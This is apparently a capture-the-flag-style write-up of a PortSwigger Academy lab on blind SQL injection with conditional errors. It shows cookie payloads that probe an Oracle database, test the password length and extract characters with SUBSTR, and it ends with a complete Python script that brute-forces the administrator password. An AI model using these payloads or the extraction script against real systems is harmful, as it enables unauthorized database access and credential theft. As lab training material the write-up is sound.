### Blind SQL injection with conditional errors

### Beside the trackingid after putting a single quotaion , its giving 500 error so tried double quotes and got 200 .
**Request**
```http
GET / HTTP/2
Host: 0a0500e5043cc3ca80d6081b007f0006.web-security-academy.net
Cookie: TrackingId=CkT5o5xiB6guNuEN''; session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Response**
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 11449

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Blind SQL injection with conditional errors</title>
    </head>
    [...remaining are omitted...]
```
---

### Then saw its using oracle database by using dual and got 200 status code .
```http
Cookie: TrackingId=CkT5o5xiB6guNuEN'||(SELECT '' FROM dual)||';
```

### The lab told to use users table , so when I used `'||(SELECT '' FROM users||'` , I got a 500 error this means I need to give some more parameter to actually check for a single row. So I used the username to see what comes and got 200 code .
```http
Cookie: TrackingId=CkT5o5xiB6guNuEN'||(SELECT '' FROM users WHERE username='administrator')||';
```

### Noe I used the CASE where i can insert any query like length of password ,substring and check the response code . Here I used 1=1 which is True , and if it's true it will return `''`(i.e. null) and if it's false it will directly throw 500 error .
```http
Cookie: TrackingId=CkT5o5xiB6guNuEN'||(SELECT CASE WHEN (1=1) THEN '' ELSE TO_CHAR(1/0) END FROM dual)||';
```

### Now that I know username is administrator I can check the length of the password , and got 200 status code until checking the 20th character . 
```http
Cookie: TrackingId=CkT5o5xiB6guNuEN'||(SELECT CASE WHEN LENGTH(password)>19 THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'
```

### Now I gone to the intruder and put `SUBSTR(password,1,1)='a'` to check the first character of password and selected payload placing in `a` .
```http
Cookie: TrackingId=CkT5o5xiB6guNuEN'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'
```

### I generated a python script from AI to tell the password more fast than burp .
```python
import asyncio
import httpx
import string

URL = "https://0a0500e5043cc3ca80d6081b007f0006.web-security-academy.net/filter?category=Gifts"

TRACKING_ID = "CkT5o5xiB6guNuEN"
SESSION = "REDACTED"

chars = string.ascii_lowercase + string.digits
password = ""

async def test(client, pos, char):
    payload = (
        TRACKING_ID +
        f"'||(SELECT CASE WHEN SUBSTR(password,{pos},1)='{char}' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'"
    )

    try:
        r = await client.get(
            URL,
            cookies={
                "TrackingId": payload,
                "session": SESSION
            }
        )

        if r.status_code==200:
            return char

    except httpx.HTTPError:
        pass

    return None


async def main():
    global password

    async with httpx.AsyncClient(
        http2=True,
        timeout=5
    ) as client:

        for pos in range(1, 21):

            tasks = [
                test(client, pos, char)
                for char in chars
            ]

            results = await asyncio.gather(*tasks)

            found = next((x for x in results if x), None)

            if found:
                password += found
                print(f"[+] {pos}: {found}  →  {password}")
            else:
                print(f"[!] No character at position {pos}")
                break

    print("\n[+] Password:", password)


asyncio.run(main())

```

### This code checks if it gets status code 200 , it'll print the password
<img width="1920" height="597" alt="pwd" src="https://github.com/user-attachments/assets/775cc6d6-233d-47e9-a8a4-8417bad5b97d" />


### This guessed the password within 10 seconds . And now i can login with this password .






